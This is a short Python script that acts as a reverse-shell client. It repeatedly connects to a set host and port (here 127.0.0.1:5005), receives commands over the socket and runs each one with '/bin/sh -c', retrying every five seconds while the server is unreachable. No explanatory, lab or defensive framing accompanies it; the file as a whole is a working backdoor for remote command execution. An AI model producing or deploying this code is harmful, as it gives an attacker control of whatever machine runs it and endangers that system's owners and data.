import socket
import subprocess
import time

SERVER_HOST = '127.0.0.1'  
SERVER_PORT = 5005

def connect_to_server():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(f" Connecting to {SERVER_HOST}:{SERVER_PORT}...")
            client.connect((SERVER_HOST, SERVER_PORT))
            print(" Connection established. Awaiting commands...")
            
            while True:
                command = client.recv(1024).decode('utf-8')
                
                if not command or command.lower() == 'exit':
                    break
                
                subprocess.run(
                    ['/bin/sh', '-c', command], 
                    errors='replace'
                )
                
        except (socket.error, ConnectionRefusedError):
            print(" Server unavailable. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f" Error occurred: {e}")
            break
        finally:
            client.close()

if __name__ == "__main__":
    connect_to_server()
